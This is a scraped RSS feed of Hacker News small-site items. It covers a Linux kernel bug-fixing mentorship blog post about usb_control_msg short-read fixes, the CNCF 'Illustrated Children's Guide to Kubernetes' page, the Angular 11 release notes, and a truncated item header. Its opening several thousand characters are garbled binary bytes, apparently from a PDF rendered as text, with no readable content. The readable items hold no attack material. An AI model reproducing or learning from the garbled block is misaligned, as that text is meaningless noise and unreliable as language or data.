¦È^H-üÂ1.ô”]ˆöGÜßu�6Gd‚öâö6Å5^«Šu)µdï¤}øä²Í/ˆ=•S_ŽÀ@%«€…‘0Lbƒl¶¢±Î1Z&lt; ¦Ž&nbsp;üÌHÁnzÕ‰–˜äzVŠLóó)&gt;R&amp;D¦†ø˜›ÒÕWxs¤½÷ñ‘%‚2žh~ªcü¤Z÷€DëÉúÅõžŒ?Îéc§Ò�„ñ?á‚°'RˆU4ç}‡Ž@4$¶pjËŒgó—ÐÈY+®ž‚íhi¡P
Ð‘=*õ„d¾+ÑŸ¤‚,¢i«t+Jš@B~ˆ¾”S8¯Õ%¡ÆûŠÿ@L\%Ë³EÆS ·ù­â›jPˆ¥ÛÏ”
a—�²`Ç.¤kQÏÁ Öf[Ì·
~Eû”©Ç˜rxAiÅå]²5	¥nš/+í3æ6Ê£x:;Í~0Ù‰‡ƒifã½Þ°ºÜ­n1Ú¡Ç
©�dé)ÓH$w¿³æâ�”Å&lt;(k§9áY-wâ‘v�d–ö=C¯\&gt;sedÅqÉàÚ5 ¦ï5Ìz�nè|ÓÈÖ%“7dœd´[W+
»Éˆ¾‹–J*·ì9ç•‚."éÙ]ùÂdåÔ]ˆç¡óC1I¬DÞ™h¨ÏU¤BKº«æ5t·óí*èé9Á­-ÁÝæLì¹$PÔ¨-–±r
QÔj÷t�y#CÉšßÍ
BÍxÂë2å…h]õbÂ˜±¿¼KdmÒ\ºÊZûÈ	)ƒ {¶9A–íþ)_º67Ò&nbsp;NB£†z¶:k“±Ðõš�m€Có;¢«ÎT
Ø�)!¬r©Š±ÑCúó&nbsp;ˆž›ê•#pŸØkÇFTïÔÅ‹–-ˆó OB%:‰
LdrNªïÖYä9â³°Þ¥H6ÄÒú’_T&nbsp;8§¤Ñ
yu
»up&nbsp;s+�¤�³tX­YìXF±“rïÕ¦€»œÓ%Ñií945”»1’UfkJý;EèÓµàŠòPj‰ílGœeÉÄêýÒgiu(¥š¯%'²@Î7:†xOXqéÌ…ÍM(tÙó_8¢7�ò¢º›Ž!.Dÿo3Ëˆ-_ï¦Q—_³RÌF'¦,º6z¤^g)ÍD1»›ôSø[)�cs¨h)&lt;\Üo.2íËq?[¼»qI,²v;âw­.4Êeœ.�=y&nbsp;ÅˆèíýÀ&nbsp;¾PoÂY“·�XLp�&lt;„�,êåÛ8gË¯×@[^¬P\{xÂÐ©·ÌçxÉbH
KhïUD½Ì@´Ëf/Àdá^Íx"&amp;´Ä–v…ßÍŒÞyàÒ:IjÇÀŒ!(ÎVŽ�Å¦[WØ’+^¸ú›è`n‹Ô�&amp;øçi':“w9¦L&lt;¶[Qu™Wà3‰û  ;ì(ÿÙðØìn\é±jN÷s“NËÍÖ�2åŠ\qõ¦L¥¼)Ÿ•4Ãä)Œð¯†~4ŽrR?�wÍ}f Ù…ŠÅ}Ì&gt;±YK9å!u
Ä kxWœûPU¡ÌkMD�1&lt;®…¢N&gt;ç–S"SöFÉ
õÉrd�¼/TÛ’hÏsñþÂî-5·[(Ú¾Öd8OF­©¥f^ò†ÛûB3êw…z}(2ãµˆÌÇ³«ûqÍÙ0ò]8Ô•§r�oÈºölŠ	¤«=]™~TŽýIXMêùjHm¾[:DTn8Ü%‚Öí'riå/ì&gt;s„ëœ‘)Hæ‚ÞÁM�S9—Ü		¯‹T`{MÌ»0˜òžÉÁ%»˜(¿µñ^AbÑ5&amp;ö7_›Œ[„)ƒòßu-™p:�¹–¿ôÚuçR(­ÛŒ¦gd•ðùKi-�Õz4‘žûsPÆí(ç”O…Öo‘ŽþäÔÄ‹f2žb`Qõþ©¤ßÔµçuqÎyéïOAw÷{±LÑ•mNäôø)…</h[þg*à-üñ9òyq3ô?n2®&ž�mš®¸‡93×ñ«ìvvu#;.¸ƒšðj…:ú!‰b¹&�yû\çj·�øï¸jß²”ã3y–w-‡„ã¹àfg¹ù¥qbëã></k“ið"{¬€¹éfº…é‡è5ò></swï.></l}k&r></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://people.idsia.ch/~juergen/fastestuniverse.pdf">http://people.idsia.ch/~juergen/fastestuniverse.pdf</a></em></p>]]>
            </description>
            <link>http://people.idsia.ch/~juergen/fastestuniverse.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065400</guid>
            <pubDate>Thu, 12 Nov 2020 01:37:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux Kernel Bug Fixing Mentorship]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065177">thread link</a>) | @simonpure
<br/>
November 11, 2020 | https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship | <a href="https://web.archive.org/web/*/https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="634481719919165440">
                    
                        
                            <h3><a href="https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">Linux Kernel Bug Fixing Mentorship</a></h3>
                        <p>I recently finished a three months long <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2F&amp;t=NWIxNzk4NzZiYzRkYzkzZGZiZThjOWNmYTMyMDMyOWIxYmY1Y2ExOSxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605385122" target="_blank">CommunityBridge(now knows as LFX)</a> mentorship with <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.linuxfoundation.org%2F&amp;t=ODM1ZjBmYjlkOWEzYjM3MWJiNTNkNTA1OWU1MWI4NjgyN2E3YzdiOCxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605385122" target="_blank">The Linux Foundation</a>. I worked as a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2Fproject%2Ff06db0d5-537e-4e0f-8ca4-0a471f95a04d&amp;t=OGZiOTA0Y2EzNjAxYTVmZTU2YTE3ZTY5MGUyNzQyYTQzZWM0MTI1NSxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605385122" target="_blank">Linux kernel bug fixing</a> mentee under <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.kroah.com%2Flog%2Fabout.html&amp;t=NTRjM2Q2NDBmNTE4ZDNhZDZkNGE5YTVhZmI0OWM1NDIxNTliMmQ5MCxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605385122" target="_blank">Greg Kroah-Hartman</a>. This post is about my experience and work during the mentorship program.</p><p>In
the first week of the mentorship program, I learned about debugging
techniques for the Linux kernel, how to use decode_stacktrace.sh, and
what is CONFIG_KASAN. These were all unfamiliar concepts for me, and
I found the mentors’ learning resources very useful. My first task
was to write summaries of my understanding of these concepts. I found
these summaries quite helpful while fixing real bugs in the kernel
later in the mentorship.</p><p>I
was also unfamiliar with syzkaller and syzbot before becoming part of
the mentorship. So after completing the summary tasks, I spent the
next few days getting familiar with these tools. The syzbot dashboard
has hundreds of reported bugs, and I found it a little challenging to
decide which one I should pick first.</p><p>In
the meantime, my mentor, Greg KH, redirected me towards an ongoing
discussion regarding a bug produced due to a short read in
usb_control_msg() call. There existed a few ways to fix it, and after
discussing them with the mentor, I proposed a fix. The patch
generated a fair amount of discussion, and I also received comments
that the proposed fix wasn’t the right way to handle the bug. The
discussion also concluded that many other usages of
usb_control_msg(), which don’t have proper error checks, are also
prone to similar bugs. I fixed the bug by adding an adequate error
check to prevent short reads in the caller, and Greg KH wrote new
wrapper functions for usb_control_msg() to be used in such scenarios
to avoid similar bugs.</p><p>Apart
from this bug, I also explored two other bugs. I found them
fascinating because inspite of being listed on the dashboard, their
reproducers weren’t triggering any issues. I learned that a commit
had fixed one of these bugs, and it was yet to be applied to all
kernel trees. But the other bug didn’t have any reported fix, yet the
reproducer wasn’t triggering the issue. I discussed this with the
mentor and learned that the syzbot dashboard isn’t quite dynamic. So
we decided to mark the bug as “invalid.” On a later
discussion with other community members I learned that it was not a
good idea, and I’ve ended up marking a potentially valid bug as
“invalid”!</p><p>As
a follow-up work on the first usb_control_msg() bug, I submitted a
cleanup patch series for some of the drivers/net/usb files. One of
those patches ignored the GFP_NOIO flag used in the original code and
replaced it with the GFP_KERNEL flag used in the new wrapper API
functions. It was a blunder that resulted in a discussion to add a
new argument for memory allocation flags in the wrapper functions.
Now the wrapper functions take memory flags as arguments preventing
mentees like me from repeating such blunders.</p><p>I
continued the follow-up work by investigating drivers/usb/serial/
files. I noticed that many usages of usb_control_msg() rely on its
return value of the number of bytes read/wrote. And the new wrapper
functions don’t retain that information. So I had a discussion with
the mentor about if that information was really necessary. We
concluded that it is almost always unnecessary, and having an error
code returned is a better way.</p><p>I
ended up submitting 19 patches as part of the mentorship program. The
first one is a fix for the usb_control_msg() short read bug. The next
three are cleanup patches for usb_control_msg() wrapper functions for
drivers/net/usb files, which were rejected because of the memory flag
blunder. And the remaining 15 are usb_control_msg() cleanup patches
for drivers/usb/serial/ files. Greg KH has reviewed them, but they
are not yet merged in the mainline.</p><p>Apart
from the bug fixing, I also learned few other interesting things
about the Linux kernel and its developer community, like how we test
various changes in the kernel and why we strictly use plain text
emails. I also attended talks at the Linux Plumber’s Conference and
the Open Source Summit Europe during the mentorship, which helped me
catch up with what is happening in the kernel world, learn new
things, and make new connections.</p><p>
My
mentorship program experience has been fantastic, and I recommend it
to everyone interested in pursuing Linux kernel development and
looking for mentoring. I am heartily thankful to my mentor Greg KH,
Shuah Khan, and The Linux Foundation, for providing me with this
opportunity and a great learning experience. 
</p><p>Patches can be found on&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flore.kernel.org%2Flkml%2F%3Fq%3Dhimadrispandya&amp;t=ZTI5NzBlNmNkYTdjYmUyYzdhMjQwMTM1NWNjYjE2OGEwYTA5NzYzMixxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605385122" target="_blank"> https://lore.kernel.org/lkml/?q=himadrispandya.<br></a></p>
                    </article></div>]]>
            </description>
            <link>https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065177</guid>
            <pubDate>Thu, 12 Nov 2020 01:13:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Illustrated Children's Guide to Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065144">thread link</a>) | @tomasreimers
<br/>
November 11, 2020 | https://www.cncf.io/phippy/ | <a href="https://web.archive.org/web/*/https://www.cncf.io/phippy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article>
		
<div><figure><img loading="lazy" width="472" height="487" src="https://www.cncf.io/wp-content/uploads/2020/07/phippy-01-1.svg" alt=""></figure><p><strong>Phippy</strong>&nbsp;is a simple PHP app, trying to find a home in a cloud native world.</p></div>







<div><div>




<h2>Introducing Phippy and friends</h2>












</div></div>







<div>
<div>
<figure><img loading="lazy" width="849" height="651" src="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg 849w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-300x230.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-768x589.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-261x200.jpg 261w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-700x537.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-222x170.jpg 222w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-352x270.jpg 352w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-443x340.jpg 443w" sizes="(max-width: 849px) 100vw, 849px"></figure>




</div>



<div>
<h3>The Illustrated Children’s Guide to Kubernetes</h3>



<p><em>The Illustrated Children’s Guide to Kubernetes</em> is a simple, gentle answer a father gave his daughter when she inquisitively asked about Kubernetes. It’s dedicated to all the parents who try to explain software engineering to their children.</p>



<p>The star of <em>The Illustrated Children’s Guide to Kubernetes</em>, Phippy and her friends explain the core concepts of Kubernetes in simple terms.</p>




</div>
</div>







<div>
<div>
<h3>Phippy Goes to the Zoo</h3>



<p>Follow the tale of Phippy and her niece Zee as they take an educational trip to the Kubernetes Zoo.</p>








</div>



<div>
<figure><img loading="lazy" width="851" height="655" src="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg 851w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-300x231.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-768x591.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-260x200.jpg 260w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-700x539.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-221x170.jpg 221w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-351x270.jpg 351w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-442x340.jpg 442w" sizes="(max-width: 851px) 100vw, 851px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy and Zee go to the Mountains</h3>



<p>Another work featuring Phippy and friends: Join Phippy and Zee on a 4-dimensional hike!</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="768" src="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-300x225.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-768x576.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-267x200.jpg 267w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-700x525.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-227x170.jpg 227w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-360x270.jpg 360w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-453x340.jpg 453w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8.jpg 1367w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy In Space: Adventures in Cloud-Native Recovery</h3>



<p>In the not-so-distant future, space outposts (cloud-native infrastructure) are the next frontier for settlement and Captain Kube is in charge of the cutting-edge Mars outpost. As the outpost has grown in size and complexity, Captain Kube needs to find solutions for many of the settlement’s growing pains. He has recruited Phippy to work with him on the outpost’s Day 2 challenges.</p>



<p>Join them on their adventure, as they journey to Mars and brainstorm solutions.</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="792" src="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-300x232.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-768x594.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1536x1187.jpg 1536w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-259x200.jpg 259w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-700x541.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-220x170.jpg 220w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-349x270.jpg 349w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-440x340.jpg 440w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space.jpg 1568w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>















<p>The characters Phippy, Captain Kube, Goldie, and Zee and the two books are owned by The Linux Foundation, on behalf of the Cloud Native Computing Foundation, and licensed under the Creative Commons Attribution License (<a href="https://creativecommons.org/licenses/by/4.0/">CC-BY</a>), which means that you can remix, transform, and build upon the material for any purpose, even commercially. If you use the characters, please include the text “<a href="https://phippy.io/">phippy.io</a>” to provide attribution (and online, please include a link to&nbsp;<a href="https://phippy.io/">https://phippy.io</a>).</p>



<p>The characters and the two books were created by&nbsp;<a href="https://twitter.com/technosophos">Matt Butcher</a>,&nbsp;<a href="https://twitter.com/karenhchu">Karen Chu</a>, and&nbsp;<a href="https://www.baileyjeanstudio.com/">Bailey Beougher</a>&nbsp;and donated by Microsoft to CNCF. Goldie is based on the Go Gopher, created by&nbsp;<a href="https://blog.golang.org/gopher">Renee French</a>, which is also licensed under&nbsp;<a href="https://creativecommons.org/licenses/by/3.0/" target="_blank" rel="noreferrer noopener">CC-BY</a>.</p>



<p>Images of Phippy, Captain Kube, Goldie, and Zee are available in the CNCF&nbsp;<a href="https://github.com/cncf/artwork/blob/master/examples/other.md#phippy--friends-group-logos">artwork</a>&nbsp;repo in svg and png formats and in color, black, and white.</p>
	</article>
</div></div>]]>
            </description>
            <link>https://www.cncf.io/phippy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065144</guid>
            <pubDate>Thu, 12 Nov 2020 01:10:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Version 11 of Angular Now Available]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25065091">thread link</a>) | @mgechev
<br/>
November 11, 2020 | https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7 | <a href="https://web.archive.org/web/*/https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@markathompson?source=post_page-----74721b7952f7--------------------------------" rel="noopener"><img alt="Mark Techson" src="https://miro.medium.com/fit/c/96/96/1*2hqK0rVXWghtk_RLFx33oA.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Photo of a Torch Ginger by Jules Kremer" src="https://miro.medium.com/max/2368/0*55kr1t601sp22pkE" width="1184" height="1091" srcset="https://miro.medium.com/max/552/0*55kr1t601sp22pkE 276w, https://miro.medium.com/max/1104/0*55kr1t601sp22pkE 552w, https://miro.medium.com/max/1280/0*55kr1t601sp22pkE 640w, https://miro.medium.com/max/1400/0*55kr1t601sp22pkE 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*55kr1t601sp22pkE?q=20"></p></div></div></div><figcaption>Photo of a Torch Ginger by Jules Kremer</figcaption></figure><p id="1feb"><strong>Welcome to the Angular version 11 release.</strong></p><p id="1877">Version 11.0.0 is here and we’ve got some great updates for Angular developers everywhere. This release has updates across the platform including the framework, the CLI and components. Let’s dive in!</p><h2 id="1182">Updates on Operation Byelog</h2><p id="593b">When we shared <a href="https://angular.io/guide/roadmap" rel="noopener">Angular’s Roadmap</a>, one of the items was Operation Byelog where we committed to putting a significant engineering effort towards triaging issues and PRs until we have a clear understanding of the broader community needs. We can now report that the original goal is complete! We’ve triaged all the issues in all three of the monorepos and will continue this as an ongoing effort as new issues get reported.</p><p id="bc06">This is our commitment: Going forward all new issues reported will be triaged within 2 weeks.</p><p id="2104">In the process, we resolved a few <a href="https://github.com/angular/angular/issues/12842" rel="noopener">popular</a> <a href="https://github.com/angular/angular/issues/18469" rel="noopener">issues</a> in the <a href="https://github.com/angular/angular/issues/13011" rel="noopener">router</a> and <a href="https://github.com/angular/angular/issues/14542" rel="noopener">forms</a>.</p><p id="a1cd">Also, we’ve closed the <a href="https://github.com/angular/angular/issues/11405" rel="noopener"><em>third most popular issue</em></a><em>!</em></p><p id="5773">Now, we’re planning the next steps to support the Angular community. We’ll continue triaging and fixing issues, and work towards improving our processes for accepting community contributions.</p><h2 id="4683">Automatic Inlining of Fonts</h2><p id="6a67">To make your apps even faster by speeding up their <a href="https://web.dev/first-contentful-paint/" rel="noopener">first contentful paint</a>, we’re introducing automatic font inlining. During compile time Angular CLI will download and inline fonts that are being used and linked in the application. We enable this by default in apps built with version 11. All you need to do to take advantage of this optimization is update your app!</p><h2 id="124e">Component Test Harnesses</h2><p id="78d2">In Angular v9 we introduced Component Test Harnesses. They provide a robust and legible API surface to help with testing Angular Material components. It gives developers a way to interact with Angular Material components using the supported API during testing.</p><p id="2932">Releasing with version 11, we have harnesses for all of the components! Now developers can create more robust test suites.</p><p id="3e07">We’ve also included performance improvements and new APIs. The <em>parallel</em> function makes working with asynchronous actions in your tests easier by allowing developers to run multiple asynchronous interactions with components in parallel. The <em>manualChangeDetection</em> function gives developers access to finer grained control of change detection by disabling automatic change detection in unit tests.</p><p id="752c">For more details and examples of these APIs and other new features, be sure to check out the <a href="http://material.angular.io/cdk/test-harnesses/overview" rel="noopener">documentation for Angular Material</a> Test Harnesses!</p><h2 id="173a">Improved Reporting and Logging</h2><p id="968c">We’ve made changes to the builder phase reporting to make it even more helpful during development. We are bringing in new CLI output updates to make logs and reports easier to read.</p><figure><div><div><p><img alt="Screenshot of angular CLI output nicely formatted into columns." src="https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX" width="607" height="355" srcset="https://miro.medium.com/max/552/0*-dCa80651cnfbjpX 276w, https://miro.medium.com/max/1104/0*-dCa80651cnfbjpX 552w, https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX 607w" sizes="607px" data-old-src="https://miro.medium.com/max/60/0*-dCa80651cnfbjpX?q=20"></p></div></div><figcaption>Improved CLI output formatting</figcaption></figure><h2 id="970e">Updated Language Service Preview</h2><p id="650a">The Angular Language Service provides helpful tools to make development with Angular productive and fun. The current version of the language service is based on View Engine and today we’re giving a sneak peek of the Ivy-based language service. The updated language service provides a more powerful and accurate experience for developers.</p><p id="15e6">Now, the language service will be able to correctly infer generic types in templates the same way the TypeScript compiler does. For example, in the screenshot below we’re able to infer that the iterable is of type string.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Screenshot of intellisense style insights in Angular templates." src="https://miro.medium.com/max/3000/0*L1Tg13gdu3PCqUNN" width="1500" height="902" srcset="https://miro.medium.com/max/552/0*L1Tg13gdu3PCqUNN 276w, https://miro.medium.com/max/1104/0*L1Tg13gdu3PCqUNN 552w, https://miro.medium.com/max/1280/0*L1Tg13gdu3PCqUNN 640w, https://miro.medium.com/max/1400/0*L1Tg13gdu3PCqUNN 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*L1Tg13gdu3PCqUNN?q=20"></p></div></div></div><figcaption>Angular Language Service inferring iterable types in templates</figcaption></figure><p id="e67f">This powerful new update is still in development but we wanted to share an update as we keep preparing it for a full release in an upcoming version.</p><h2 id="48a5">Updated Hot Module Replacement (HMR) Support</h2><p id="303f">Angular has offered support for HMR but enabling it required configuration and code changes making it less than ideal to quickly include in Angular projects. In version 11 we’ve updated the CLI to allow enabling HMR when starting an application with ng serve. To get started, run the following command:</p><pre><span id="3ac4">ng serve --hmr</span></pre><p id="f3bc">After the local server starts the console will display a message confirming that HMR is active:</p><p id="f521">NOTICE: Hot Module Replacement (HMR) is enabled for the dev server.</p><p id="5155">See <a href="https://webpack.js.org/guides/hot-module-replacement" rel="noopener">https://webpack.js.org/guides/hot-module-replacement</a> for information on working with HMR for webpack.</p><p id="3796">Now during development the latest changes to components, templates and styles will be instantly updated into the running application. All without requiring a full page refresh. Data typed into forms are preserved as well as scroll position providing a boost to developer productivity.</p><h2 id="6de3">Faster Builds</h2><p id="630c">We’re bringing a faster development and build cycle by making updates to some key areas.</p><ul><li id="4336">When installing dependencies, the ngcc update process is now 2–4x faster.</li><li id="b30d">Faster compilation with TypeScript v4.0.</li></ul><p id="ed18">Now, teams can opt-in to webpack v5. Currently, you could experiment with <a href="https://webpack.js.org/concepts/module-federation/" rel="noopener">module federation</a>. In the future, webpack v5 will clear the path for:</p><ul><li id="db89">Faster builds with persistent disk caching</li><li id="7ab4">Smaller bundles thanks to <a href="https://webpack.js.org/guides/tree-shaking/" rel="noopener">cjs tree-shaking</a></li></ul><p id="dae8">Support is experimental and under development so we don’t recommend opting in for production uses.</p><p id="4ca8">Want to try out webpack 5? To enable it in your project, add the following section to your package.json file:</p><pre><span id="386c">"resolutions": {<br>     "webpack": "5.4.0"<br>}</span></pre><p id="65a0">Currently, you’ll need to use <strong>yarn</strong> to test this as npm does not yet support the resolutions property.</p><h2 id="d0a9">Linting</h2><p id="e4b2">In previous versions of Angular, we’ve shipped a default implementation for linting (TSLint). Now, TSLint is deprecated by the project creators who recommend migration to ESLint. <a href="https://twitter.com/mrjameshenry" rel="noopener">James Henry</a> together with other folks from the open-source community developed a third-party solution and migration path via <a href="https://github.com/typescript-eslint/typescript-eslint" rel="noopener">typescript-eslint</a>, <a href="https://github.com/angular-eslint/angular-eslint" rel="noopener">angular-eslint</a> and <a href="https://github.com/typescript-eslint/tslint-to-eslint-config" rel="noopener">tslint-to-eslint-config</a>! We’ve been collaborating closely to ensure a smooth transition of Angular developers to the supported linting stack.</p><p id="6071">We’re deprecating the use of TSLint and Codelyzer in version 11. This means that in future versions the default implementation for linting Angular projects will not be available.</p><p id="806d">Head over to the <a href="https://github.com/angular-eslint/angular-eslint#migrating-from-codelyzer-and-tslint" rel="noopener">official project page</a> for a guide to incorporate angular-eslint in a project and migrate from TSLint.</p><h2 id="98a6">Housekeeping</h2><p id="0727">In this update we’re removing support for IE9/IE10 and IE mobile. IE11 is the only version of IE <a href="https://angular.io/guide/browser-support" rel="noopener">still supported</a> by Angular. We’ve also <a href="https://angular.io/guide/deprecations" rel="noopener">removed deprecated APIs</a> and added a few to the deprecation list. Be sure to check this out to make sure you are using the latest APIs and following our recommended best practices.</p><h2 id="a3c7">Roadmap</h2><p id="9aad">We’ve also updated the <a href="https://angular.io/guide/roadmap" rel="noopener">roadmap</a> to keep you posted on our current priorities. Some of the announcements in this post are updates on in-progress projects from the roadmap. This reflects our approach to incrementally rollout larger efforts and allows developers to provide early feedback that we can incorporate it into the final release.</p><p id="8c07">We collaborated with <a href="https://twitter.com/simpulton" rel="noopener">Lukas Ruebbelke</a> from the Angular community on updating the content of some of the projects to better reflect the value they provide to developers.</p><h2 id="6939">How to update to get version 11</h2><p id="0170">When you are ready to go run this command to update Angular and CLI:</p><pre><span id="5983">ng update @angular/cli @angular/core</span></pre><p id="ac5f">Head over to <a href="https://update.angular.io/" rel="noopener">update.angular.io</a> to find detailed information and guidance on updating. We always recommend upgrading one major release at a time to have the best update experience.</p><p id="732f">We hope you enjoy this feature update and be sure to let us know what you think here or on <a href="https://twitter.com/angular" rel="noopener">Twitter</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065091</guid>
            <pubDate>Thu, 12 Nov 2020 01:06:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MacBook Air in Pure CSS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064721">thread link</a>) | @ent101
<br/>
November 11, 2020 | https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css | <a href="https://web.archive.org/web/*/https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css">archive.org</a>
